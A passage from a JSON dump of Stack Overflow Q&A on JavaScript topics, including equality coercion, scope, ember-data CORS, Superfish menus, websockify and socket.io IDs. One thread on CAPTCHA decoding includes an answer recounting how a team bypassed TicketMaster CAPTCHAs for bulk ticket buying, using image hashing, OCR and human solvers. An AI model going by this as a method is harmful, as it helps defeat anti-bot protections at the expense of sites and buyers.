fundamentals</strong></p>\n\n<p><strong>2- General understanding of a Neural Network</strong></p>\n\n<p><strong>3- Simple image processing functions (in any language)</strong></p>\n\n<p>For PHP:</p>\n\n<pre><code>imagecreate()\n\nimagecreatetruecolor()\n\nimagecolorat()\n\nimagecolorsforindex()\n\nimagesetpixel()\n.\n.\n.\n</code></pre>\n\n<p>For .NET:</p>\n\n<pre><code>Bitmap type,\ngetPixel()\nsetPixel()\n.\n.\n.\n</code></pre>\n\n<p>For JavaScript and HTML5:</p>\n\n<pre><code>You should know the Canvas very well.\n</code></pre>\n\n<p>Lastly:\n<strong>Note for captcha decoding fighter: If you are wonder about how someone can decode a CAPTCHA and want to prevent it from decoding, you should first be a CAPTCHA decoder yourself or hire someone knows the weakness and attacking algorithm very well!</strong></p>\n\n<p>Hope to help! ;)</p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>I was involved in a project to circumvent Captcha images on the TicketMaster website about 8-9 years ago for a third-party ticket seller. When an event went on-sale, like a concert, our network of machines would use multiple credit cards and mailing addresses to buy any and every seat possible in the first 10 rows. </p>\n\n<p>Rather than generating new captcha's each time, TM had a limited pool of images they could re-use. We'd create a unique digital fingerprint (checksum) for each image, then simply attack it with some imaging tools (LEADTOOLS.com) (to remove extraneous elements, enhance contrast, etc) and then use OCR tools. It was surprisingly effective. </p>\n\n<p>We were able to crack a great number programmatically, and we'd store the ones we couldn't crack for human processing. Sometimes they'd have a pool of 20K images, so at first we'd get maybe 60-70% automatically, but eventually we'd get 100% success because we could identify the images our humans processed (offline) based on looking up their hash in our database. (That is, we could check a captcha image against our database based on the hash we created and if we already had the solution we could just submit the answer immediately.) </p>\n\n<p>Occasionally, they'd flush and replace their pool of captcha image images with a new set, but again, it would just take us a bit of time to get back up to a 100% rate. The fatal flaw with this particular system was that they recycled images, rather than programmatically generating new captcha images each time.</p>\n\n<p>But the fact is, if the financial incentive to crack the capthcha is high enough, it doesn't take much to create a distributed platform where low-wage unskilled workers can sit around earning pocket change to crack them all day.</p>\n\n<p>Inside India's CAPTCHA solving economy\n<a href=\"http://www.zdnet.com/blog/security/inside-indias-captcha-solving-economy/1835\" rel=\"nofollow\">http://www.zdnet.com/blog/security/inside-indias-captcha-solving-economy/1835</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have seen some captchas being decode using javascript, php, etc. How do they do it?</p>\n\n<p>For example, very popular <strong>megaupload</strong> site's <a href=\"http://herecomethelizards.co.uk/mu_captcha/\">captcha has also been decoded</a>.</p>\n",
            "last_activity_date": 1373751226,
            "question_id": 2880519,
            "score": 10,
            "tags": [
                "php",
                "javascript",
                "security"
            ],
            "title": "Captcha Decoded"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>Javascript doesn't cast \"false\" to boolean false, only to the string \"false\".</p>\n\n<p>You can loosely cast string values to their integer equivalent, thus your first example works.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Doing this:</p>\n\n<pre><code>if(5 == \"5\")\n</code></pre>\n\n<p>Makes javascript convert the first 5 to a string. Try this:</p>\n\n<pre><code>if(5 === \"5\")\n</code></pre>\n\n<p>The <code>===</code> makes Javascript evaluate type as well.</p>\n\n<p>This is actually a duplicate of this <a href=\"http://stackoverflow.com/questions/359494/javascript-vs\"><code>question</code></a> where it is explained very well.</p>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>Because Javascript is loosely typed, it will silently cast your variables depending on the operation and the type of the other variables in the operation.</p>\n\n<pre><code>alert (\"5\" - 1);  // 4  (int)\nalert (\"5\" + 1);  // \"51\" (string) \"+\" is a string operator, too\nalert (\"5\" == 5); // true\n</code></pre>\n\n<p>What you might want to look at is <strong>identity</strong> checking (<code>===</code>). That makes sure the variables are <em>identical</em>, not merely <em>equal</em>.</p>\n\n<pre><code>alert(\"5\" == 5);  // true, these are equal\nalert(\"5\" === 5); // false, these are not identical.\n</code></pre>\n\n<p>Also see this question: <a href=\"http://stackoverflow.com/questions/80646/how-do-the-equality-and-identity-comparison-operators-differ\">How do the equality and identity comparison operators differ?</a> PHP's implementation is very similar to javascript's.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>Javascript is a loosely typed language, so typecasts are done at runtime whenever the interpreter feels it is needed. If you compare an integer to a string, it figures that they should be the same type, so, for example, \"34\" == 34 is true, since the integer would probably be typecasted to a string before the comparison.</p>\n\n<p>The string \"false\" isn't typecasted into a bool, instead the bool false is typecasted to a string, which would acctually have the value \"0\", that is, a string containing the number 0, giving \"0\" == \"false\", which is obviously false.</p>\n\n<p>If you want to compare the value without automatic typecasting, effectively comparing types as well as values, use a triple equal:</p>\n\n<p>5 === \"5\" false\n\"string\" === \"string\" true</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>JavaScript has two sets of equality operators:</p>\n\n<ul>\n<li><code>=== and !==</code> (strict equality operators)</li>\n<li><code>== and !=</code> (standard equality operators)</li>\n</ul>\n\n<p>The standard equality operators will do the right comparison if both operands are the same type, but you can get some unexpected results if they're not the same type, for example:</p>\n\n<pre><code>'' == '0' // false\n0 == '' // true\n0 == '0' // true\nfalse == 'false' // false\nfalse == '0' // true\nfalse == undefined // false\nfalse == null // false\nnull == undefined // true\n' \\t\\r\\n ' == 0 // true\n</code></pre>\n\n<p>For that I always recommend to use the strict equality operators (===, !==).</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>The behavior of == is a bit lengthy, but clearly defined in the <a href=\"http://www.ecma-international.org/publications/standards/Ecma-262.htm\">ecma-262 spec</a>:</p>\n\n<blockquote>\n  <p>11.9.3 The Abstract Equality Comparison Algorithm</p>\n  \n  <p>The comparison x == y, where x and y\n  are values, produces true or false.\n  Such a comparison is performed as\n  follows:</p>\n  \n  <ol>\n  <li>If Type(x) is different from Type(y), go to step 14.</li>\n  <li>If Type(x) is Undefined, return true.</li>\n  <li>If Type(x) is Null, return true.</li>\n  <li>If Type(x) is not Number, go to step 11.</li>\n  <li>If x is NaN, return false.</li>\n  <li>If y is NaN, return false.</li>\n  <li>If x is the same number value as y, return true.</li>\n  <li>If x is +0 and y is \u22120, return true.</li>\n  <li>If x is \u22120 and y is +0, return true.</li>\n  <li>Return false.</li>\n  <li>If Type(x) is String, then return true if x and y are exactly the same\n  sequence of characters (same length\n  and same characters in corresponding\n  positions). Otherwise, return false.</li>\n  <li>If Type(x) is Boolean, return true if x and y are both true or both\n  false. Otherwise, return false.</li>\n  <li>Return true if x and y refer to the same object or if they refer to\n  objects joined to each other (see 13.1.2). Otherwise, return false.</li>\n  <li>If x is null and y is undefined, return true.</li>\n  <li>If x is undefined and y is null, return true.</li>\n  <li>If Type(x) is Number and Type(y) is String, return the result of the\n  comparison x == ToNumber(y).</li>\n  <li>If Type(x) is String and Type(y) is Number, return the result of the\n  comparison ToNumber(x) == y.</li>\n  <li>If Type(x) is Boolean, return the result of the comparison ToNumber(x) == y.</li>\n  <li>If Type(y) is Boolean, return the result of the comparison x ==\n  ToNumber(y).</li>\n  <li>If Type(x) is either String or Number and Type(y) is Object, return\n  the result of the comparison x ==\n  ToPrimitive(y).</li>\n  <li>If Type(x) is Object and Type(y) is either String or Number, return the\n  result of the comparison\n  ToPrimitive(x) == y.</li>\n  <li>Return false.</li>\n  </ol>\n</blockquote>\n\n<p>Step 16 applies to your former example:</p>\n\n<pre><code>   0 == \"0\"            // apply 16\n\u2261  0 == toNumber(\"0\")\n\u2261  0 == 0              // apply 7\n\u2261  true\n</code></pre>\n\n<p>And step 18, then step 16, apply to the latter:</p>\n\n<pre><code>   true == \"true\"            // apply 18\n\u2261  toNumber(true) == \"true\"\n\u2261  1 == \"true\"               // apply 16\n\u2261  1 == toNumber(\"true\")\n\u2261  1 == NaN                  // apply 6\n\u2261  false\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 29
                },
                {
                    "body": "<blockquote>\n  <p>Why is it so?</p>\n</blockquote>\n\n<p>Because JavaScript is both loosely-typed, and wildly inconsistent. Not all its design features are well-thought-through; it was created, implemented and deployed incredibly quickly compared to any other programming language, in a rush to get Netscape 2.0 out. It wasn't until long after that it settled down, lost some of the more egregious bugs and became semi-standardised.</p>\n\n<p>Looking for some kind of philosophical rationale for things like the implicit type casting rules is likely to be a fruitless exercise. The only really consistent principle JavaScript adheres to is <a href=\"http://www.catb.org/~esr/jargon/html/D/DWIM.html\" rel=\"nofollow\">DWIM</a>, very much in the negative sense.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>JavaScript defines falsey values to be 0, boolean false and undefined.  Any string outside of \"0\" will be true, even if that string is 'false'.</p>\n\n<p>Kind of annoying, really.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>If I do 0 == \"0\" it evaluates to true. Try, </p>\n\n<pre><code>if( -777 == \"-777\" ) alert(\"same\");\n</code></pre>\n\n<p>alert happens.</p>\n\n<p>And, it's also noticeable that true == \"true\" doesn't evaluate to true. Try,</p>\n\n<pre><code>if( false == \"false\" ) alert(\"same\");\n</code></pre>\n\n<p>alert doesn't happen.</p>\n\n<p>Why is it so?</p>\n",
            "last_activity_date": 1293958051,
            "question_id": 664886,
            "score": 10,
            "tags": [
                "javascript",
                "variables",
                "comparison"
            ],
            "title": "In Javascript, &lt;int-value&gt; == &quot;&lt;int-value&gt;&quot; evaluates to true. Why is it so?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>As I understand it, these are equivalent as far as scoping is concerned:</p>\n\n<pre><code>function a() { ... }\n</code></pre>\n\n<p>and</p>\n\n<pre><code>var a = function() { ... }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>This is static scoping.  Statements within a function are scoped within that function.  </p>\n\n<p>Javascript has a quirky behavior, however, which is that without the <strong>var</strong> keyword, you've implied a <strong>global variable</strong>.  That's what you're seeing in your test.  Your \"d\" variable is available because it is an implied global, despite being written within the body of a function.</p>\n\n<p>Also, to answer the second part of your question:  A function exists in whatever scope it is declared, just like a variable.</p>\n\n<p><strong>Sidenote:</strong> \nYou probably don't want global variables, especially not implied ones.  It's recommended that you always use the var keyword, to prevent confusion and to keep everything clean.</p>\n\n<p><strong>Sidenote:</strong>\nThe ECMA Standard isn't probably the most helpful place to find answers about Javascript, although it certainly isn't a bad resource.  Remember that javascript in your browser is just an implementation of that standard, so the standards document will be giving you the rules that were (mostly) followed by the implementors when the javascript engine was being built.  It can't offer specific information about the implementations you care about, namely the major browsers.  There are a couple of books in particular which will give you very direct information about how the javascript implementations in the major browsers behave.  To illustrate the difference, I'll include excerpts below from both the ECMAScript specification, and a book on Javascript.  I think you'll agree that the book gives a more direct answer.</p>\n\n<p>Here's from the <strong>ECMAScript Language Specification</strong>:</p>\n\n<blockquote>\n  <p>10.2 <em>Entering An Execution Context</em></p>\n  \n  <p>Every function and constructor call\n  enters a new execution context, even\n  if a function is calling itself\n  recursively. Every return exits an\n  execution context. A thrown exception,\n  if not caught, may also exit one or\n  more execution contexts. </p>\n  \n  <p>When control\n  enters an execution context, the scope\n  chain is created and initialised,\n  variable instantiation is performed,\n  and the this value is determined. </p>\n  \n  <p>The\n  initialisation of the scope chain,\n  variable instantiation, and the\n  determination of the this value depend\n  on the type of code being entered.</p>\n</blockquote>\n\n<p>Here's from <strong>O'Reilly's <a href=\"http://oreilly.com/catalog/9780596101992/index.html\">Javascript: The Definitive Guide (5th Edition)</a></strong>:</p>\n\n<blockquote>\n  <p>8.8.1 Lexical Scoping</p>\n  \n  <p>Functions in JavaScript are lexically\n  rather than dynamically scoped. This\n  means that they run in the scope in\n  which they are defined, not the scope\n  from which they are executed.  When a\n  function is defined, the current scope\n  chain is  saved and becomes part of\n  the internal state of the function.\n  ...</p>\n</blockquote>\n\n<p>Highly recommended for covering these kinds of questions is Douglas Crockford's book: </p>\n\n<p><img src=\"http://oreilly.com/catalog/covers/9780596517748_cat.gif\" alt=\"JavaScript, The Good Parts\" /></p>\n\n<p><a href=\"http://oreilly.com/catalog/9780596517748/index.html\"><strong>Javascript, The Good Parts</strong></a>, also from O'Reilly.</p>\n",
                    "is_accepted": true,
                    "score": 20
                },
                {
                    "body": "<p>...</p>\n\n<pre><code>function a() {\n   function b() {\n      alert('boo')\n   }\n   var c = 'Bound to local call object.'\n   d = 'Bound to global object.'\n}\n</code></pre>\n\n<p>without being preceded by <em>var</em>, d is global. Do this to made d private:</p>\n\n<pre><code>function a() {\n   function b() {\n      alert('boo')\n   }\n   var c = 'Bound to local call object.'\n   var d = 'Bound to local object.'\n}\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>It seems important to note that while d is being created as a \"global\", it is in reality being created as a property of the window object.  This means that you could inadvertently be overwriting something that already exists on the window object or your variable might actually fail to be created at all.  So:</p>\n\n<pre><code>function a() {\n    d = 'Hello World';\n}\nalert(window.d); // shows 'Hello World'\n</code></pre>\n\n<p>But you cannot do:</p>\n\n<pre><code>function a() {\n    document = 'something';\n}\n</code></pre>\n\n<p>because you cannot overwrite the window.document object.</p>\n\n<p>For all practical purposes you can imaging that all of your code is running in a giant <code>with(window)</code> block.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Javascript has two scopes.  Global, and functional.  If you declare a variable inside a function using the \"var\" keyword, it will be local to that function, and any inner functions.  If you declare a variable outside of a function, it has global scope.</p>\n\n<p>Finally, <strong>if you omit the var keyword when first declaring a variable, javascript assumes you wanted a global variable, no matter where you declare it</strong>.</p>\n\n<p>So, you're calling function a, and function a is declaring a global variable d.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Today I had a discussion with a colleague about nested functions in Javascript:</p>\n\n<pre><code>function a() {\n   function b() {\n      alert('boo')\n   }\n   var c = 'Bound to local call object.'\n   d = 'Bound to global object.'\n}\n</code></pre>\n\n<p>In this example, trials point out that b is not reachable outside the body of a, much like c is. However, d is - after executing a(). Looking for the exact definition of this behaviour in the <a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf\">ECMAScript v.3 standard </a>, I didn't find the exact wording I was looking for; what Sec.13 p.71 does not say, is which object the function object created by the function declaration statement is to be bound to. Am I missing something?</p>\n",
            "last_activity_date": 1282088413,
            "question_id": 235360,
            "score": 10,
            "tags": [
                "javascript",
                "functional-programming",
                "scope",
                "ecma262"
            ],
            "title": "What is the scope of a function in Javascript/ECMAScript?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>The <code>RESTAdapter</code> expects <code>JSON</code> that is not the problem but the page and the json are not on the same domain, this is a security issue. You can resolve this by using one of the two solutions named below.</p>\n\n<p>You're running into the <a href=\"http://en.wikipedia.org/wiki/Same_origin_policy\">same origin policy</a> you should either use <code>JSONP</code> or <code>CORS</code>. The quickest fix would probably be to tell ember-data that you want to use <code>JSONP</code>. </p>\n\n<p>For <code>CORS</code> your server needs to respond to an <code>OPTIONS</code> request with the headers:</p>\n\n<ul>\n<li><code>Access-Control-Allow-Origin</code></li>\n<li><code>Access-Control-Request-Method</code></li>\n</ul>\n\n<p>i'm no rails expert but you will probably need to do something with the gem <code>rack-cors</code> see <a href=\"http://blog.carbonfive.com/2012/02/27/supporting-cross-domain-ajax-in-rails-using-jsonp-and-cors/\">here</a> or <a href=\"https://rubygems.org/gems/rack-cors\">here</a>.</p>\n\n<p>You could do that by overriding the <code>ajax</code> hook in the <code>RESTAdapter</code> like so:</p>\n\n<pre><code>App.store = DS.Store.create({\n    revision: 11,\n    adapter: DS.RESTAdapter.create({\n        namespace: \"data\",\n        url: \"\",\n        ajax: function (url, type, hash) {\n            hash.url = url;\n            hash.type = type;\n            hash.dataType = 'jsonp';\n            hash.contentType = 'application/json; charset=utf-8';\n            hash.context = this;\n\n            if (hash.data &amp;&amp; type !== 'GET') {\n                hash.data = JSON.stringify(hash.data);\n            }\n\n            jQuery.ajax(hash);\n        },\n    })\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 10
                },
                {
                    "body": "<p>I have a simple work around in Rails (that is working for me so far.) It is untidy as is, but can easily be tightened up with logic in the controllers.</p>\n\n<p>In <code>routes.rb</code>:</p>\n\n<pre><code>match   ':path' =&gt; 'authentications#allow', constraints: {method: 'OPTIONS'}\n</code></pre>\n\n<p>Which simply returns status <code>OK</code> to any <code>OPTIONS</code> request.</p>\n\n<pre><code>def allow\n  head :ok\nend\n</code></pre>\n\n<p>And then in <code>application_controller.rb</code> set the Cross-origin resource sharing (CORS) headers for every request:</p>\n\n<pre><code>before_filter :cors\ndef cors\n  response.headers.merge! 'Access-Control-Allow-Origin' =&gt; '*', 'Access-Control-Allow-Methods' =&gt; 'POST, PUT, GET, DELETE', 'Access-Control-Allow-Headers' =&gt; 'Origin, Accept, Content-Type'\nend\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If you are looking to use JSONP it's much easier to override the private <code>ajaxOptions</code> function instead of using <code>jQuery</code> and overriding the <code>ajax</code> method. Ember's pipeline includes the removal of the jQuery dependency. So do this instead:</p>\n\n<p><code>adapters/application.js</code>:</p>\n\n<pre><code>import DS from 'ember-data';\n\nexport default DS.RESTAdapter.extend({\n    ajaxOptions: function(url, type, options) {\n        var hash = this._super(url, type, options);\n        hash.dataType = \"jsonp\";\n        return hash;\n    }\n});\n</code></pre>\n\n<p>It would be create if the Ember core team could expose a public method to officially support this (instead of hacking a private api). </p>\n\n<p><a href=\"https://github.com/emberjs/data/blob/1.0.0-beta.15/packages/ember-data/lib/adapters/rest_adapter.js#L915\" rel=\"nofollow\">https://github.com/emberjs/data/blob/1.0.0-beta.15/packages/ember-data/lib/adapters/rest_adapter.js#L915</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>Cheers! \nI have ember-data store:</p>\n\n<pre><code>TravelClient.Store = DS.Store.extend({\n  revision: 11,\n  adapter: DS.RESTAdapter.create({ bulkCommit: false, url: \"http://someIP:somePORT\"})\n});\n</code></pre>\n\n<p>And router:</p>\n\n<pre><code>TravelClient.ToursRoute = Ember.Route.extend({\n  model: function() {\n    return TravelClient.Tour.find();\n  }\n});\n</code></pre>\n\n<p>I recieve this JSON from remote server:</p>\n\n<pre><code>{\n  \"tours\": [\n    {\n      \"id\": \"5110e8b5a8fefe71e0000197\",\n      \"title\": \"qui deserunt dolores\",\n      \"description\": \"Id velit nihil.\",\n      \"seats\": 12,\n      \"options\": [\n\n      ],\n      \"images\": [\n        {\n          \"id\": \"5110e8b5a8fefe71e0000196\",\n          \"url\": \"url\"\n        }\n}\n</code></pre>\n\n<p>But when I try to <code>return TravelClient.Tour.find()</code> it fails with:</p>\n\n<pre><code>http://someIP:somePORT/tours 404 (Not Found)\n\nXMLHttpRequest cannot load http://someIP:somePORT/tours. Origin http://localhost:3000 is not allowed by Access-Control-Allow-Origin.\n</code></pre>\n\n<p>IT seems like RESTAdapter doesn't know, that it must receive JSON or what?</p>\n\n<p><strong>UPDATE:</strong></p>\n\n<p>In the application controller on the rails server-side:</p>\n\n<pre><code>def set_access_control_headers\n  headers['Access-Control-Allow-Origin'] = '*'\n  headers['Access-Control-Request-Method'] = '*'\nend\n</code></pre>\n\n<p>But it's still :</p>\n\n<pre><code>OPTIONS http://someIP:somePORT/tours 404 (Not Found)\n</code></pre>\n\n<p>And it looks like RESTAdapter tries to load tours resource, not tours.json:</p>\n\n<pre><code>Request URL:http://someIP:somePORT/tours\n</code></pre>\n\n<p><strong>WORKING SOLUTION</strong></p>\n\n<p>Extend RESTAdapter:</p>\n\n<pre><code>TravelClient.CUSTOMAdapter = DS.RESTAdapter.extend({\n  bulkCommit: false, \n  url: \"http://remote_server_address\",    \n  buildURL: function(record, suffix) {\n    var s = this._super(record, suffix);\n    return s + \".json\";\n  }\n})\n</code></pre>\n\n<p>and respond to an OPTIONS request with right headers</p>\n",
            "last_activity_date": 1424641504,
            "question_id": 14828478,
            "score": 9,
            "tags": [
                "javascript",
                "json",
                "ember.js",
                "ember-data"
            ],
            "title": "Ember.js ember-data restadapter fail to load json"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p><strong>Update:</strong>\nSee the answer by Ryan Brackett</p>\n\n<p>Dropdown menus don't work well on mobile. I would suggest hiding the superfish menu on mobile and replacing it with something else.</p>\n\n<p>Resources:\n<strong>Off canvas</strong></p>\n\n<p><a href=\"http://www.lukew.com/ff/entry.asp?1569\" rel=\"nofollow\">http://www.lukew.com/ff/entry.asp?1569</a></p>\n\n<p><a href=\"http://www.zurb.com/playground/off-canvas-layouts\" rel=\"nofollow\">http://www.zurb.com/playground/off-canvas-layouts</a></p>\n\n<p><strong>Mobile navigation patterns</strong></p>\n\n<p><a href=\"http://bradfrostweb.com/blog/web/responsive-nav-patterns/\" rel=\"nofollow\">http://bradfrostweb.com/blog/web/responsive-nav-patterns/</a></p>\n\n<p>For others looking for a solution, make sure you are using the newest jQuery. I had some older sites where I found using a newer version of jQuery made the Superfish menus work on mobile devices.</p>\n",
                    "is_accepted": true,
                    "score": 7
                },
                {
                    "body": "<p><strong>Here's a better answer</strong></p>\n\n<p>I was able to convert the same HTML for Superfish into a responsive drawer menu. The JS is ultra simple and the whole thing is basically done using CSS. Check it out and let me know what you guys think!</p>\n\n<p><b><a href=\"http://bit.ly/1o79SmX\" rel=\"nofollow\">http://jsfiddle.net/nH5Rj/</a></b></p>\n",
                    "is_accepted": false,
                    "score": 23
                },
                {
                    "body": "<p>This is what I use:</p>\n\n<pre><code>    isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);\n\n$(\".menu a\").click(function(event){\n        if($(this).parents(\"ul\").length == 1 &amp;&amp; !$(this).hasClass(\"lastClick\") &amp;&amp; isMobile)\n            event.preventDefault();     \n\n        $(\".menu a\").removeClass(\"lastClick\");\n        $(this).addClass(\"lastClick\");\n    });\n</code></pre>\n\n<p>Replace \".menu a\" with your navigation links and this snippet will navigate the user to the clicked site after the second click and the first click will only show him the subpages.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Reshad: Simply change your CSS like this:<div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-css lang-css prettyprint-override\"><code>.xpopdrop &gt; ul {\r\n        display: block!important;\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>And you will be fine.</p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I am using superfish dropdown menu with skelton framework. I wanted it to work on mobiles as well. By default its showing the dropdown items but it hover over the items below it. I wants to have it in a way so that it push parent items below it. Any solution? </p>\n",
            "last_activity_date": 1411073925,
            "question_id": 11886781,
            "score": 9,
            "tags": [
                "javascript",
                "jquery",
                "html",
                "css",
                "responsive-design"
            ],
            "title": "How to make superfish dropdown menu responsive?"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>The focus of websockify+websock.js is to transparently support streaming binary data (more on that below). The data you get off the receive queue is already base64 decoded. However, the data URI scheme is expecting a base64 encoded string so you need to encode the image data to base64. You can use the builtin window.btoa() to base64 encode a binary coded string:</p>\n\n<pre><code>img.src = \"data:image/png;base64,\" + window.btoa(str);\n</code></pre>\n\n<p>Or, for greater efficiency you can use the Base64 module from include/base64.js but you will need to pass it an array of bytes as your would get from rQshiftBytes:</p>\n\n<pre><code>msg(ws.rQshiftBytes());\n\nimg.src = \"data:image/png;base64,\" + Base64.encode(data);  // str -&gt; data\n</code></pre>\n\n<p><strong>Regarding the use of base64 in websockify:</strong></p>\n\n<p>Websockify uses base64 to encode the data to support browsers which don't support binary data directly. In addition to such popular Hixie only browsers such as iOS Safari and desktop Safari, some browsers versions in the wild use HyBi but are missing binary support. And unfortunately, in the case of Chrome, they also had a WebIDL bug around that same time which prevents detecting binary support before making a connection.</p>\n\n<p>Also, the main option for using WebSockets on Opera, firefox 3.6-5, IE 8 and 9 is <a href=\"https://github.com/gimite/web-socket-js\">web-socket-js</a>. web-socket-js supports HyBi but does not have binary support and probably won't because most of the older browsers that it targets don't support native binary types (Blob and Typed Arrays).</p>\n\n<p>The market share of browsers which support HyBi and binary data is currently pretty low. However, in the future, Websockify will detect (either by object detection or browser version detection) whether the browser supports binary data and use that support directly without the need for base64 encode/decode.</p>\n\n<p>The latency (and CPU) overhead of base64 encode/decode is pretty low and usually washed out by network latencies anyhow. The bandwidth overhead of base64 encoded data is about 25% (i.e. raw data becomes 33% larger), but it does give you binary data over WebSockets on basically all browsers in the wild (with the web-socket-js polyfill/shim which is used transparently by websockify if needed).</p>\n",
                    "is_accepted": true,
                    "score": 11
                }
            ],
            "body": "<p>I am using <code>websockify</code> to display images from a python server to a HTML5 canvas.</p>\n\n<p>I think that I have manage to successfully send images from my python server but I am not able to display the images to my canvas.</p>\n\n<p>I think the problem has to do with the number of bytes that I am trying to display on canvas and I believe that I am not waiting until the whole image is received and then displaying the image to the canvas.</p>\n\n<p>Until now I have:</p>\n\n<p>The on message function. When I sent an image I get 12 <code>MESSAGERECEIVED</code> in console</p>\n\n<pre><code>  ws.on('message', function () {\n    //console.log(\"MESSAGERECEIVED!\")\n            msg(ws.rQshiftStr());\n  });\n</code></pre>\n\n<p>The msg function where I receive the string and I am trying to display it on canvas. I invoking the method 12 times for each picture. The format of the sting is <code>'x\u00d9\u00f5K\u00fe\u00b0p\u00e3\u00fcCY</code> :</p>\n\n<pre><code>function msg(str) {\n        //console.log(str);\n        console.log(\"RELOAD\");\n\n        var ctx = cv.getContext('2d');\n        var img = new Image();\n        //console.log(str);\n        img.src = \"data:image/png;base64,\" + str;\n        img.onload = function () {\n            ctx.drawImage(img,0,0);\n        }\n    }\n</code></pre>\n\n<p>Any suggestions on how to fix this?</p>\n",
            "last_activity_date": 1341984779,
            "question_id": 9292133,
            "score": 9,
            "tags": [
                "javascript",
                "websocket"
            ],
            "title": "Receiving image through websocket"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>You can create an array on the server, and store custom objects on it. For example, you could store the id created by Socket.io and a custom ID sent by each client to the server:</p>\n\n<pre><code>var util = require(\"util\"),\n    io = require('/socket.io').listen(8080),\n    fs = require('fs'),\n    os = require('os'),\n    url = require('url');\n\n    var clients =[];\n\n    io.sockets.on('connection', function (socket) {\n\n        socket.on('storeClientInfo', function (data) {\n\n            var clientInfo = new Object();\n            clientInfo.customId         = data.customId;\n            clientInfo.clientId     = socket.id;\n            clients.push(clientInfo);\n        });\n\n        socket.on('disconnect', function (data) {\n\n            for( var i=0, len=clients.length; i&lt;len; ++i ){\n                var c = clients[i];\n\n                if(c.clientId == socket.id){\n                    clients.splice(i,1);\n                    break;\n                }\n            }\n\n        });\n    });\n</code></pre>\n\n<p>in this example, you need to call <strong>storeClientInfo</strong> from each client.</p>\n\n<pre><code>&lt;script&gt;\n    var socket = io.connect('http://localhost', {port: 8080});\n\n    socket.on('connect', function (data) {\n        socket.emit('storeClientInfo', { customId:\"000CustomIdHere0000\" });\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>Hope this helps.</p>\n",
                    "is_accepted": true,
                    "score": 13
                },
                {
                    "body": "<p>I would use an object as a hash lookup - this will save you looping through an array</p>\n\n<pre><code>var clients = {};\nclients[customId] = clientId;\n\nvar lookup = clients[customId];\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>or you can override the socket id, like this:</p>\n\n<pre><code>io.on('connection', function(socket){\n\n      socket.id = \"YOUR_CUSTOM_ID\";\n});\n</code></pre>\n\n<p>you can see under the array:</p>\n\n<p><strong>io.sockets.sockets</strong></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>In the newest socket.io (version 1.x) you can do something like this</p>\n\n<pre><code>socket  = io.connect('http://localhost');\n\nsocket.on('connect', function() {\n    console.log(socket.io.engine.id);     // old ID\n    socket.io.engine.id = 'new ID';\n    console.log(socket.io.engine.id);     // new ID\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I'm making a chat app with socket.io, and I'd like to use my custom client id, instead of the default ones (<code>8411473621394412707</code>, <code>1120516437992682114</code>). Is there any ways of sending the custom identifier when connecting or just using something to track a custom name for each ID? Thanks!</p>\n",
            "last_activity_date": 1406709805,
            "question_id": 7702461,
            "score": 9,
            "tags": [
                "javascript",
                "node.js",
                "socket.io"
            ],
            "title": "Socket.io custom client ID"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>I'm running out of time but I'm getting close to an answer, I think. I'll update this reply when I get more details, but if you want to poke at it, check out line 501 in the included consolidate.js file. View on github here: <a href=\"https://github.com/balderdashy/sails/blob/master/lib/configuration/consolidate.js#L501\" rel=\"nofollow\">https://github.com/balderdashy/sails/blob/master/lib/configuration/consolidate.js#L501</a></p>\n\n<p>It looks like for Handlebars there is a for loop that registers partials from options.partials.</p>\n\n<p>That is not exactly a very satisfying solution, but if you push your partials on to that options object then maybe it will pull from that.</p>\n\n<p>The big question I have next is, what is the options object, and where does it get set at?</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
